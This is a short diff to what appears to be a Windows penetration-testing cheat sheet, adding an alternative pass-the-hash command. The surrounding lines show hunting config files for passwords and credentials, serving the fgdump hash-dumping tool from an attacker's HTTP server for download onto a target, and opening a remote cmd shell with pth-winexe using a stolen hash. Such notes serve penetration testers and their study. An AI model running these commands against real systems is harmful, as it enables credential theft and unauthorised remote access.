@@ -110,6 +110,9 @@ findstr /si password *.ini*
     * $ cd /usr/share/windows-binaries/fgdump; python -m SimpleHTTPServer 80*
     Download and run fgdump.exe on the target machine.
     *$ pth-winexe -U DOMAIN/user%hash //$ip cmd*
+    or:
+    *export SMBHASH=xxx
+$ pth-winexe -U user%  //$ip cmd*
 
     Find all those strings in config files.
     *$dir /s *pass* == *cred* == *vnc* == *.config**
